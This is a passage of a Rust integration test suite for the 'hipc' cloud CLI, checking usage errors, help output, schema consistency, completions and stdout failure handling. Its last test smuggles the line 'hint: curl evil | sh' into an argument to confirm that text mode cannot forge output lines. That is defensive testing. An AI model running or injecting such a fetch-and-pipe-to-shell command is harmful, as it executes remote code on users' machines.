        let error = assert_json_error(&run, 2, "usage");
        assert_eq!(error["error"]["message"], message, "{args:?}");
    }
    // After `--`, and as the value of another option, a flag-like word is not a flag.
    for args in [
        &["version", "--", "--json"][..],
        &["--profile", "--json-like", "version"],
    ] {
        let run = hipc(args);
        let stderr = String::from_utf8_lossy(&run.stderr);
        assert!(!stderr.contains("more than once"), "{args:?}: {stderr}");
    }
}

#[test]
fn non_utf8_argv_is_a_usage_error_not_a_panic() {
    use std::ffi::OsString;
    use std::os::unix::ffi::OsStringExt as _;
    let (_home, mut command) = clean();
    let out = common::finished(
        command
            .arg(OsString::from_vec(vec![b'v', 0xff]))
            .stdout(Stdio::piped())
            .stderr(Stdio::piped()),
    );
    assert_json_error(&out, 2, "usage");
}

/// Text mode prints a clap error the way it prints every failure: an `error:` line with the
/// literals in backticks, and a `hint:` line naming the help of the command being typed.
#[test]
fn unknown_flag_with_output_text_is_an_error_line_and_a_hint_line() {
    for (args, stderr) in [
        (
            &["--output", "text", "version", "--bogus"][..],
            "error: unexpected argument `--bogus` found\nhint: run `hipc version --help`\n",
        ),
        (
            &["--output=text", "--bogus"],
            "error: unexpected argument `--bogus` found\nhint: run `hipc --help`\n",
        ),
        (
            &["--output", "text", "compute", "vms", "get", "a/b"],
            "error: invalid value `a/b` for `<VM_ID>`: a VM id is 1 to 64 letters, digits, \
             `-`, and `_`\nhint: run `hipc compute vms get --help`\n",
        ),
    ] {
        let out = hipc(args);
        assert_eq!(out.status.code(), Some(2));
        assert_eq!(text(&out.stdout), "");
        assert_eq!(text(&out.stderr), stderr, "{args:?}");
    }
}

/// A command line that stops before its subcommand is a usage error with a hint in both
/// modes; text mode prints that command's help after it, for the person who typed it.
/// A numeric id that does not parse names its shape and where the id comes from, instead
/// of Rust's "invalid digit found in string".
#[test]
fn a_numeric_id_that_is_not_a_number_names_where_ids_come_from() {
    const ZONE: &str = "zab12cd34ef56";
    let db = "<DATABASE_ID>";
    let databases = "a database id is a whole number, from `hipc compute databases list`";
    let key = "<KEY_ID>";
    let ssh_keys = "an SSH key id is a whole number, from `hipc compute ssh-keys list`";
    let member = "<MEMBER_ID>";
    let members = "a member id is a whole number, from `hipc account members list`";
    let cases: [(&[&str], &str, &str); 20] = [
        (
            &["hub", "subscription", "cancel", "x"],
            "<SUBSCRIPTION_ID>",
            "a subscription id is a whole number, from `hipc hub subscription get`",
        ),
        (
            &["compute", "vms", "resize-status", VM, "x"],
            "<RESIZE_ID>",
            "a resize id is a whole number, from the answer of `hipc compute vms resize`",
        ),
        (
            &[
                "compute",
                "vms",
                "create",
                "--flavor",
                "f",
                "--ssh-key-id",
                "x",
            ],
            "--ssh-key-id <ID>",
            ssh_keys,
        ),
        (&["compute", "ssh-keys", "get", "x"], key, ssh_keys),
        (&["compute", "ssh-keys", "delete", "x"], key, ssh_keys),
        (
            &["compute", "exposures", "delete", VM, "x"],
            "<EXPOSURE_ID>",
            "an exposure id is a whole number, from `hipc compute exposures list`",
        ),
        (&["compute", "databases", "get", "x"], db, databases),
        (&["compute", "databases", "delete", "x"], db, databases),
        (&["compute", "databases", "restart", "x"], db, databases),
        (&["compute", "databases", "events", "x"], db, databases),
        (&["compute", "databases", "metrics", "x"], db, databases),
        (&["compute", "databases", "restore", "x"], db, databases),
        (
            &["compute", "databases", "exposure", "create", "x"],
            db,
            databases,
        ),
        (
            &["compute", "databases", "exposure", "delete", "x"],
            db,
            databases,
        ),
        (
            &["compute", "runners", "installations", "delete", "x"],
            "<INSTALLATION_ID>",
            "an installation id is a whole number, from `hipc compute runners installations list`",
        ),
        (
            &["cdn", "purges", "get", ZONE, "x"],
            "<PURGE_ID>",
            "a purge id is a whole number, from the answer of `hipc cdn purges create`",
        ),
        (
            &["billing", "invoices", "get", "x"],
            "<INVOICE_ID>",
            "an invoice id is a whole number, from `hipc billing invoices list`",
        ),
        (&["account", "members", "delete", "x"], member, members),
        (&["account", "members", "update", "x"], member, members),
        (
            &["account", "invites", "revoke", "x"],
            "<INVITE_ID>",
            "an invite id is a whole number, from `hipc account invites list`",
        ),
    ];
    for (args, name, rule) in cases {
        let out = hipc(args);
        let error = assert_json_error(&out, 2, "usage");
        assert_eq!(
            error["error"]["message"],
            format!("invalid value `x` for `{name}`: {rule}"),
            "{args:?}"
        );
    }
}

#[test]
fn a_missing_subcommand_is_a_usage_error_with_help_after_it_in_text_mode() {
    let out = hipc(&["--output", "text", "compute"]);
    assert_eq!(out.status.code(), Some(2));
    let stderr = text(&out.stderr);
    let (own, help) = stderr
        .split_once("\n\n")
        .expect("a blank line before the help");
    let (message, hint) = own.split_once('\n').expect("an error line and a hint line");
    assert!(
        message.starts_with("error: a subcommand is required; `hipc compute` holds `prices`, "),
        "{message}"
    );
    assert!(message.contains(", `vms`, "), "{message}");
    assert_eq!(hint, "hint: run `hipc compute --help`");
    assert!(help.contains("Usage: hipc compute"), "{stderr}");
    // JSON mode gets no help after it, so the message is where the commands are listed.
    let error = assert_json_error(&hipc(&["compute"]), 2, "usage");
    assert_eq!(
        error["error"]["message"].as_str(),
        message.strip_prefix("error: ")
    );
    assert_eq!(error["error"]["hint"], "run `hipc compute --help`");
}

/// An unknown subcommand names the commands its group holds, and its hint is the help of
/// the nearest one, at that place or deeper, as `hipc schema` finds it for a path; with
/// none near, the group's help.
#[test]
fn an_unknown_subcommand_lists_the_group_and_points_at_the_nearest_command() {
    for (args, message, hint) in [
        (
            &["vm"][..],
            "`hipc` has no command `vm`; it holds `version`, ",
            "run `hipc compute vms --help`",
        ),
        (
            &["compute", "vms", "lst"],
            "`hipc compute vms` has no command `lst`; it holds `list`, ",
            "run `hipc compute vms list --help`",
        ),
        (
            &["runners", "limit", "get"],
            "`hipc` has no command `runners`; it holds ",
            "run `hipc compute runners --help`",
        ),
        (
            &["cdn", "waf", "rate-limits", "create"],
            "`hipc cdn waf rate-limits` has no command `create`; it holds `get` and `update`",
            "run `hipc cdn waf rate-limits --help`",
        ),
        (
            &["account", "team"],
            "`hipc account` has no command `team`; it holds `list`, ",
            "run `hipc account --help`",
        ),
        (
            &["", "x"],
            "`hipc` has no command with an empty name; it holds ",
            "run `hipc --help`",
        ),
    ] {
        let error = assert_json_error(&hipc(args), 2, "usage");
        let got = error["error"]["message"].as_str().unwrap_or_default();
        assert!(got.starts_with(message), "{args:?}: {got}");
        assert_eq!(error["error"]["hint"], hint, "{args:?}");
    }
    // A command renamed before 1.0 is a plain unknown subcommand now.
    let error = assert_json_error(&hipc(&["hub", "namespace", "check", "x"]), 2, "usage");
    assert_eq!(error["error"]["hint"], "run `hipc hub namespace --help`");
}

/// Flags before the stop make clap say it another way; hipc still says it one way, and
/// prints the long help of the command reached.
#[test]
fn a_missing_subcommand_after_flags_reads_the_same_and_prints_the_long_help() {
    for (args, command) in [
        (&["--output", "text", "--profile", "work"][..], "hipc"),
        (&["--output", "text", "compute", "--debug"], "hipc compute"),
    ] {
        let out = hipc(args);
        assert_eq!(out.status.code(), Some(2), "{args:?}");
        let stderr = text(&out.stderr);
        let (own, help) = stderr
            .split_once("\n\n")
            .expect("a blank line before the help");
        assert!(
            own.starts_with(&format!(
                "error: a subcommand is required; `{command}` holds "
            )),
            "{own}"
        );
        assert!(
            own.ends_with(&format!("\nhint: run `{command} --help`")),
            "{own}"
        );
        assert!(help.contains(&format!("Usage: {command} ")), "{stderr}");
    }
    // The long help of `compute` carries its second paragraph, which `-h` leaves out.
    let out = hipc(&["--output", "text", "compute", "--debug"]);
    assert!(
        text(&out.stderr).contains("hipc does not open SSH"),
        "{}",
        text(&out.stderr)
    );
    let error = assert_json_error(&hipc(&["--json"]), 2, "usage");
    assert!(
        error["error"]["message"]
            .as_str()
            .is_some_and(|message| message.starts_with("a subcommand is required; `hipc` holds ")),
        "{error}"
    );
    assert_eq!(error["error"]["hint"], "run `hipc --help`");
}

#[test]
fn arguments_after_a_double_dash_do_not_choose_the_mode() {
    let out = hipc(&["--output", "text", "nope", "--", "--json"]);
    assert_eq!(out.status.code(), Some(2));
    assert!(text(&out.stderr).starts_with("error:"));
}

#[test]
fn help_and_version_flags_exit_zero_on_stdout_in_every_mode() {
    for mode in ["text", "json"] {
        for args in [
            &["--help"][..],
            &["-h"],
            &["schema", "--help"],
            &["completions", "--help"],
        ] {
            let mut full = vec!["--output", mode];
            full.extend_from_slice(args);
            let out = hipc(&full);
            assert_eq!(out.status.code(), Some(0), "{full:?}");
            assert_eq!(text(&out.stderr), "");
            assert!(text(&out.stdout).contains("Usage: hipc"), "{full:?}");
        }
        for flag in ["-V", "--version"] {
            let out = hipc(&["--output", mode, flag]);
            assert_eq!(out.status.code(), Some(0));
            assert_eq!(
                text(&out.stdout),
                format!("hipc {}\n", env!("CARGO_PKG_VERSION"))
            );
        }
    }
}

/// The global flags of tenet 2, in the order `--help` lists them.
const GLOBAL_FLAGS: [&str; 13] = [
    "--output",
    "--json",
    "--profile",
    "--api-url",
    "--account",
    "--project",
    "--billing",
    "--yes",
    "--no-input",
    "--dry-run",
    "--debug",
    "--quiet",
    "--request-timeout",
];

/// The long flag of each option line in a `-h` text, in order. An option line is indented
/// two spaces (`  -h, --help`) or six (`      --name <NAME>`), and `-h` prints its
/// description on the same line, after the flag, so the first `--` word is the flag.
fn option_flags(help: &str) -> Vec<&str> {
    help.lines()
        .filter(|line| line.starts_with("  -") || line.starts_with("      --"))
        .filter_map(|line| line.split_whitespace().find(|word| word.starts_with("--")))
        .collect()
}

/// The root help lists the global flags under their own heading, after its own options.
/// Every other help page, from each group to each leaf in `hipc schema`, lists only the
/// command's own options and ends with one line that points to the root help for the global
/// ones, so a command's required flags stand out and its page stays short.
#[test]
fn every_help_lists_its_own_options_before_the_global_ones() {
    let schema = json(&hipc(&["schema"]).stdout);
    let mut paths = BTreeSet::new();
    for command in schema["commands"].as_array().unwrap() {
        let path: Vec<String> = command["path"]
            .as_array()
            .unwrap()
            .iter()
            .map(|word| word.as_str().unwrap().to_owned())
            .collect();
        for len in 0..=path.len() {
            paths.insert(path[..len].to_vec());
        }
    }
    for path in paths {
        let mut args: Vec<&str> = path.iter().map(String::as_str).collect();
        args.push("-h");
        let out = hipc(&args);
        assert_eq!(out.status.code(), Some(0), "{args:?}");
        let help = text(&out.stdout);
        let own = if path.is_empty() {
            let (own, global) = help
                .split_once("\nGlobal options:\n")
                .unwrap_or_else(|| panic!("{args:?} has no Global options heading:\n{help}"));
            assert_eq!(option_flags(global), GLOBAL_FLAGS, "{args:?}");
            own
        } else {
            assert!(!help.contains("\nGlobal options:\n"), "{args:?}:\n{help}");
            assert!(
                help.ends_with("\n\nGlobal options: see hipc --help\n"),
                "{args:?}:\n{help}"
            );
            help
        };
        let own = option_flags(own);
        assert!(own.contains(&"--help"), "{args:?}: {own:?}");
        assert!(
            own.iter().all(|flag| !GLOBAL_FLAGS.contains(flag)),
            "{args:?}: {own:?}"
        );
    }
}

/// The `-h` headings whose lines are arguments.
const ARGUMENT_HEADINGS: [&str; 3] = ["Arguments", "Options", "Global options"];

/// One argument line of a `-h` text under `heading`, as clap renders it:
/// `<VALUE>` for a positional argument, `--name <VALUE>` or `--name` for a flag, then the
/// short help with clap's `[default: ...]` and `[possible values: ...]` after it.
#[derive(Debug, PartialEq, Eq, PartialOrd, Ord)]
struct HelpLine {
    heading: String,
    /// The `--name` of a flag; `None` for a positional argument.
    flag: Option<String>,
    value_name: Option<String>,
    help: String,
}

/// The argument lines of a `-h` text, without `-h, --help` and `-V, --version`, which clap
/// adds to every command and `hipc schema` leaves out.
///
/// `-h` prints an argument on one line, its name and its help apart by two spaces or more,
/// unless one of the section's lines would pass 100 columns: then every name is on a line of
/// its own, indented two or six spaces, and its help on the next, indented ten.
fn help_lines(help: &str) -> Vec<HelpLine> {
    let mut lines: Vec<HelpLine> = Vec::new();
    let mut heading = None;
    for line in help.lines() {
        if let Some(name) = line.strip_suffix(':').filter(|_| !line.starts_with(' ')) {
            heading = ARGUMENT_HEADINGS.contains(&name).then_some(name);
            continue;
        }
        let Some(heading) = heading.filter(|_| line.starts_with("  ")) else {
            heading = None;
            continue;
        };
        if line.starts_with("          ") {
            let last = lines.last_mut().expect("a help line follows its name line");
            line.trim_start().clone_into(&mut last.help);
            continue;
        }
        let (spec, text) = line.trim_start().split_once("  ").unwrap_or((line, ""));
        let mut words = spec.split_whitespace();
        // `-h, --help` names its flag in the second word.
        let first = words
            .find(|word| !word.ends_with(','))
            .expect("an argument line names the argument");
        let value = |word: &str| word.trim_matches(['<', '>', '[', ']', '.']).to_owned();
        let (flag, value_name) = if first.starts_with("--") {
            (Some(first.to_owned()), words.next().map(value))
        } else {
            (None, Some(value(first)))
        };
        lines.push(HelpLine {
            heading: heading.to_owned(),
            flag,
            value_name,
            help: text.trim_start().to_owned(),
        });
    }
    lines.retain(|line| !matches!(line.flag.as_deref(), Some("--help" | "--version")));
    lines
}

/// The line `-h` prints under `heading` for one `args`, `flags`, or `global_flags` entry of
/// `hipc schema`.
fn schema_line(heading: &str, entry: &Value) -> HelpLine {
    let mut help = entry["help"]
        .as_str()
        .expect("every argument has a help")
        .to_owned();
    if let Some(default) = entry["default"].as_str() {
        help.push_str(&format!(" [default: {default}]"));
    }
    let values: Vec<&str> = entry["possible_values"]
        .as_array()
        .expect("possible_values is an array")
        .iter()
        .map(|value| value.as_str().expect("a possible value is a string"))
        .collect();
    if !values.is_empty() {
        help.push_str(&format!(" [possible values: {}]", values.join(", ")));
    }
    let name = entry["name"].as_str().expect("an argument has a name");
    HelpLine {
        heading: heading.to_owned(),
        flag: name.starts_with("--").then(|| name.to_owned()),
        value_name: entry["value_name"].as_str().map(str::to_owned),
        help,
    }
}

/// The `hipc schema` entries of `command[field]`, as the lines `-h` prints under `heading`.
fn schema_lines(command: &Value, field: &str, heading: &str) -> Vec<HelpLine> {
    command[field]
        .as_array()
        .unwrap_or_else(|| panic!("{field} is an array: {command}"))
        .iter()
        .map(|entry| schema_line(heading, entry))
        .collect()
}

/// What the `Usage:` line of a `-h` text says a command requires, after its path.
#[derive(Debug, Default, PartialEq, Eq)]
struct Usage {
    /// Each required flag, as `--name`.
    flags: Vec<String>,
    /// Each positional argument, in order: its value name, whether it is required (`<ID>`,
    /// not `[ID]`), and whether it repeats (`<ID>...`).
    positionals: Vec<(String, bool, bool)>,
    /// Each set of flags of which one is required, as clap prints it: `<--a|--b <B>>`.
    groups: Vec<Vec<String>>,
}

/// The `Usage:` line of the `-h` text of the command at `path`.
///
/// A required flag is followed by its value, `--name <VALUE>`: no required flag of `hipc` is
/// a switch, and the test asserts that, so the word after a flag is its value.
fn usage(help: &str, path: &[&str]) -> Usage {
    let line = help
        .lines()
        .find_map(|line| line.strip_prefix("Usage: hipc "))
        .expect("a help has a usage line");
    let rest = line
        .strip_prefix(&path.join(" "))
        .unwrap_or_else(|| panic!("the usage of {path:?} starts with its path: {line}"));
    let mut usage = Usage::default();
    let mut words = rest.split_whitespace();
    while let Some(word) = words.next() {
        if word == "[OPTIONS]" {
            continue;
        }
        if word.starts_with("--") {
            usage.flags.push(word.to_owned());
            let value = words.next().unwrap_or_default();
            assert!(value.starts_with('<'), "{path:?}: {word} has no value");
        } else if word.starts_with("<--") {
            let mut group = word.to_owned();
            let depth = |text: &str| text.matches('<').count() - text.matches('>').count();
            while depth(&group) > 0 {
                group.push(' ');
                group.push_str(words.next().expect("a group closes on the usage line"));
            }
            let inner = &group[1..group.len() - 1];
            let names = inner.split('|').map(|alternative| {
                let name = alternative
                    .split(' ')
                    .next()
                    .expect("an alternative is named");
                name.to_owned()
            });
            usage.groups.push(names.collect());
        } else {
            let name = word.trim_matches(['<', '>', '[', ']', '.']).to_owned();
            usage
                .positionals
                .push((name, word.starts_with('<'), word.ends_with("...")));
        }
    }
    usage
}

/// What the schema says the usage line of `command` shows.
fn schema_usage(command: &Value) -> Usage {
    let entries = |field: &str| {
        command[field]
            .as_array()
            .expect("a list of entries")
            .clone()
    };
    let name = |entry: &Value| entry["name"].as_str().expect("a name").to_owned();
    let mut flags: Vec<String> = entries("flags")
        .iter()
        .filter(|flag| flag["required"] == true)
        .map(name)
        .collect();
    flags.sort();
    let positionals = entries("args")
        .iter()
        .map(|arg| {
            let value = arg["value_name"]
                .as_str()
                .expect("a positional has a value name");
            (
                value.to_owned(),
                arg["required"] == true,
                arg["repeats"] == true,
            )
        })
        .collect();
    let groups = entries("required_groups")
        .iter()
        .map(|group| {
            let names = group["names"].as_array().expect("a group names flags");
            let names = names.iter().map(|n| n.as_str().expect("a flag name"));
            names.map(str::to_owned).collect()
        })
        .collect();
    Usage {
        flags,
        positionals,
        groups,
    }
}

/// Values the flags of `hipc` accept, tried in turn until one parses: a number, a path, a
/// grant, an IP address, an email address, a month, a date, a region, a time, a region
/// amount, a zone prefix, a WAF tier's zone count, and a dedicated disk, each the form its
/// flag's value parser names. A directory is tried too: the run's own empty home, which
/// `takes_twice` adds.
const VALUE_CANDIDATES: [&str; 18] = [
    "1",
    "/a/",
    "vms=operator",
    "192.0.2.1",
    "a@example.com",
    "2026-09",
    "2026-09-30",
    "FR",
    "2026-10-27T09:30:00Z",
    "FR=100",
    "site/",
    "standard=1",
    "1000:hdd",
    "acct_0123456789abcdef0123",
    "default",
    "gpu=true:NoSchedule",
    "3f2c9a1e-7b4d-4e8a-9c01-5d6e7f8a9b0c",
    "5DfhGyQdFobKM8NsWvEeAKk5EQQgYe9AydgJ7rMB6E1EqRzV",
];

/// Whether clap takes `flag` of the command at `path` twice, read from a run of
/// `hipc <path> <flag> [value] <flag> [value] -h`: clap refuses a second use of a flag that
/// does not repeat as it reads it, and prints the help at `-h` otherwise. A value that does
/// not parse is refused before the second use, so the next candidate is tried.
fn takes_twice(path: &[&str], flag: &Value) -> bool {
    let name = flag["name"].as_str().expect("a flag has a name");
    // An empty directory of this test's own, for `--credentials-dir`, which takes only an
    // existing directory without the credential files in it.
    let dir = Home::new();
    let dir_text = dir.path().to_str().expect("the temporary home is UTF-8");
    let candidates: Vec<&str> = match flag["value_name"].as_str() {
        None => vec![""],
        Some(_) => flag["possible_values"][0]
            .as_str()
            .or_else(|| flag["default"].as_str())
            .into_iter()
            .chain(VALUE_CANDIDATES)
            .chain([dir_text])
            .collect(),
    };
    for value in candidates {
        let once: Vec<&str> = [name, value]
            .into_iter()
            .filter(|w| !w.is_empty())
            .collect();
        let args = [path, &once, &once, &["-h"]].concat();
        let out = hipc(&args);
        if out.status.code() == Some(0) {
            return true;
        }
        if text(&out.stderr).contains("cannot be used multiple times") {
            return false;
        }
    }
    panic!("{path:?} {name}: no candidate value parses; add one to VALUE_CANDIDATES")
}

/// Every argument and flag the parser gives a command is in `hipc schema`, in the order its
/// `-h` lists them, with the value name, default, possible values, and help it shows; the
/// required flags, positional arguments, and required sets its usage line shows; and the
/// repeat bit clap applies when a flag is given twice. The global flags are listed once, at
/// the top level. The help and the parse are clap's own reading of the parser, so a
/// flag added, renamed, moved, or hidden without the schema following fails here.
#[test]
fn schema_lists_every_argument_and_flag_the_help_shows() {
    let schema = json(&hipc(&["schema"]).stdout);
    let globals = schema_lines(&schema, "global_flags", "Global options");
    let names: Vec<&str> = globals.iter().filter_map(|l| l.flag.as_deref()).collect();
    assert_eq!(names, GLOBAL_FLAGS);
    let root = hipc(&["-h"]);
    let root_globals: Vec<_> = help_lines(text(&root.stdout))
        .into_iter()
        .filter(|line| line.heading == "Global options")
        .collect();
    assert_eq!(
        root_globals, globals,
        "the root help lists every global flag"
    );
    for command in schema["commands"].as_array().unwrap() {
        let mut args: Vec<&str> = command["path"]
            .as_array()
            .unwrap()
            .iter()
            .map(|word| word.as_str().unwrap())
            .collect();
        let mut expected = schema_lines(command, "args", "Arguments");
        // A positional argument is named by its id, never by a flag spelling.
        assert!(expected.iter().all(|line| line.flag.is_none()), "{args:?}");
        expected.extend(schema_lines(command, "flags", "Options"));
        args.push("-h");
        let out = hipc(&args);
        assert_eq!(out.status.code(), Some(0), "{args:?}");
        let help = text(&out.stdout);
        let (own, global): (Vec<_>, Vec<_>) = help_lines(help)
            .into_iter()
            .partition(|line| line.heading != "Global options");
        // The global flags are on the root help alone, checked below.
        assert_eq!(global, [], "{args:?}");
        assert_eq!(own, expected, "{args:?}");
        args.pop();
        let mut shown = usage(help, &args);
        shown.flags.sort();
        assert_eq!(shown, schema_usage(command), "{args:?}");
        for flag in command["flags"].as_array().unwrap() {
            let repeats = takes_twice(&args, flag);
            assert_eq!(flag["repeats"], repeats, "{args:?} {flag}");
        }
    }
}

/// The usage reader reads required flags, positional arguments, and required sets.
#[test]
fn usage_reads_flags_positionals_and_groups() {
    let help = "Usage: hipc x y [OPTIONS] --kind <KIND> <--all|--path <PATH>|--p <P>> <ID> \
                [NAME]...\n";
    assert_eq!(
        usage(help, &["x", "y"]),
        Usage {
            flags: vec!["--kind".to_owned()],
            positionals: vec![
                ("ID".to_owned(), true, false),
                ("NAME".to_owned(), false, true)
            ],
            groups: vec![vec![
                "--all".to_owned(),
                "--path".to_owned(),
                "--p".to_owned()
            ]],
        }
    );
}

/// The help reader of the test above reads each kind of argument line clap prints, and
/// skips the lines under any other heading.
#[test]
fn help_lines_reads_positionals_flags_and_switches() {
    let help = "About\n\nUsage: hipc x [OPTIONS] <ID>\n\nArguments:\n  <ID>  The id\n  \
                [NAME]...  Names\n\nOptions:\n      --kind <KIND>  A kind [possible values: \
                a, b]\n      --all          Everything\n  -h, --help  Print help\n\n\
                Global options:\n      --wide <W>\n          Wide help\n  -V, --version\n\
                \x20         Print version\n      --yes\n          Confirm\n\n\
                Examples:\n  hipc x 1\n";
    let line = |heading: &str, flag: Option<&str>, value: Option<&str>, help: &str| HelpLine {
        heading: heading.to_owned(),
        flag: flag.map(str::to_owned),
        value_name: value.map(str::to_owned),
        help: help.to_owned(),
    };
    assert_eq!(
        help_lines(help),
        [
            line("Arguments", None, Some("ID"), "The id"),
            line("Arguments", None, Some("NAME"), "Names"),
            line(
                "Options",
                Some("--kind"),
                Some("KIND"),
                "A kind [possible values: a, b]"
            ),
            line("Options", Some("--all"), None, "Everything"),
            line("Global options", Some("--wide"), Some("W"), "Wide help"),
            line("Global options", Some("--yes"), None, "Confirm"),
        ]
    );
}

#[test]
fn completions_print_a_script_for_every_shell() {
    for (shell, marker) in [
        ("bash", "_hipc()"),
        ("zsh", "#compdef hipc"),
        ("fish", "complete -c hipc"),
        ("elvish", "edit:completion:arg-completer[hipc]"),
        ("powershell", "Register-ArgumentCompleter"),
    ] {
        // JSON mode too: a completion script is the document itself, never wrapped.
        for mode in ["text", "json"] {
            let out = hipc(&["--output", mode, "completions", shell]);
            assert_eq!(out.status.code(), Some(0), "{shell}");
            assert_eq!(text(&out.stderr), "");
            assert!(text(&out.stdout).contains(marker), "{shell} in {mode}");
        }
    }
}

#[test]
fn no_output_contains_an_escape_sequence() {
    for args in [
        &["version"][..],
        &["--output", "text", "version"],
        &["--output", "text", "schema"],
        &["--help"],
        &["--output", "text", "--bogus"],
        &["--bogus"],
        &[],
        &["--output", "text"],
    ] {
        let out = hipc(args);
        assert!(!out.stdout.contains(&0x1b), "{args:?} stdout");
        assert!(!out.stderr.contains(&0x1b), "{args:?} stderr");
    }
}

#[test]
fn a_closed_pipe_is_not_a_panic() {
    // The read end is closed before hipc starts, so its first write fails with EPIPE every
    // time, as `hipc ... | head -0` would.
    let (reader, writer) = std::io::pipe().unwrap();
    drop(reader);
    let (_home, mut command) = clean();
    let out = common::finished(
        command
            .args(["completions", "zsh"])
            .stdout(writer)
            .stderr(Stdio::piped()),
    );
    assert_eq!(out.status.code(), Some(0));
    assert_eq!(text(&out.stderr), "");
}

/// A stdout closed before `hipc` starts reads as `> /dev/null`: the Rust runtime reopens a
/// closed fd 0, 1, or 2 on `/dev/null` before `main`, so by then `hipc` holds the same
/// `/dev/null` a redirect gives it. This pins that documented behavior (TENETS 15):
/// exit 0, and nothing on stderr.
#[test]
fn a_stdout_closed_before_the_start_reads_as_dev_null() {
    let (_home, hipc) = clean();
    // A shell closes the descriptor, since `Command` can only point it somewhere; it runs
    // `hipc` with the clean environment `hipc` would get.
    let mut shell = Command::new("sh");
    shell
        .arg("-c")
        .arg(r#"exec "$0" schema >&-"#)
        .arg(hipc.get_program());
    for (name, value) in hipc.get_envs() {
        match value {
            Some(value) => shell.env(name, value),
            None => shell.env_remove(name),
        };
    }
    let out = common::finished(shell.stdout(Stdio::piped()).stderr(Stdio::piped()));
    assert_eq!(out.status.code(), Some(0));
    assert_eq!(text(&out.stderr), "");
}

/// `/dev/full` fails every write with ENOSPC. macOS has no such device. The coverage job
/// runs on Linux, so this path is measured there.
#[cfg(target_os = "linux")]
#[test]
fn a_full_stdout_is_an_internal_error() {
    let full = std::fs::OpenOptions::new()
        .write(true)
        .open("/dev/full")
        .unwrap();
    let (_home, mut command) = clean();
    let out = common::finished(command.arg("version").stdout(full).stderr(Stdio::piped()));
    assert_eq!(out.status.code(), Some(1));
    let error = json(&out.stderr);
    assert_eq!(error["error"]["code"], "internal");
    assert_eq!(
        error["error"]["message"],
        "cannot write to stdout: the device is full"
    );
}

/// A write the server did is still reported when its document cannot be written.
#[cfg(target_os = "linux")]
#[test]
fn a_full_stdout_after_a_write_is_partial() {
    let server = common::Server::start(vec![common::route(
        "DELETE",
        "/api/ssh-keys/3/",
        common::Reply::bytes(204, "application/json", b""),
    )]);
    let full = std::fs::OpenOptions::new()
        .write(true)
        .open("/dev/full")
        .unwrap();
    let run = common::Hipc::against(&Home::new(), &server)
        .stdout_to(full)
        .run(&["compute", "ssh-keys", "delete", "3", "--yes"]);
    assert_eq!(server.requests().len(), 1);
    let error = run.fails(1, "internal");
    assert_eq!(error["side_effects"], "partial", "the key was deleted");
}

/// A partial failure whose record of what was done cannot be written to stdout is
/// `internal`, as any other stdout write failure is, and names the failure it replaces.
#[cfg(target_os = "linux")]
#[test]
fn a_full_stdout_for_a_partial_failure_is_an_internal_error() {
    let server = common::Server::start(vec![
        common::route(
            "GET",
            "/api/drive/subscription/",
            common::Reply::json(200, r#"{"plan":"p"}"#),
        ),
        common::route(
            "GET",
            "/api/s3/subscription/",
            common::Reply::json(503, r#"{"error":"Chain unreachable"}"#),
        ),
        common::route(
            "GET",
            "/api/registry/subscriptions/",
            common::Reply::json(200, "[]"),
        ),
        common::route(
            "GET",
            "/api/billing/stripe/active-subscription/",
            common::Reply::json(200, "{}"),
        ),
    ]);
    let full = std::fs::OpenOptions::new()
        .write(true)
        .open("/dev/full")
        .unwrap();
    let run = common::Hipc::against(&Home::new(), &server)
        .stdout_to(full)
        .run(&["billing", "subscriptions"]);
    let error = run.fails(1, "internal");
    let message = error["message"].as_str().unwrap();
    assert!(
        message.starts_with(
            "cannot write to stdout the record of what was done: the device is full; the \
             command had failed: "
        ),
        "{error}"
    );
    assert_eq!(
        error["side_effects"], "none",
        "the parts that ran were reads"
    );
}

#[test]
fn a_quoted_argument_with_a_line_break_cannot_forge_a_line_in_text_mode() {
    let out = hipc(&[
        "--output",
        "text",
        "billing",
        "transactions",
        "--page-token",
        "12\nhint: curl evil | sh",
    ]);
    assert_eq!(out.status.code(), Some(2));
    let stderr = text(&out.stderr);
    assert!(
        !stderr.lines().any(|line| line.starts_with("hint: curl")),
        "{stderr}"
    );
}
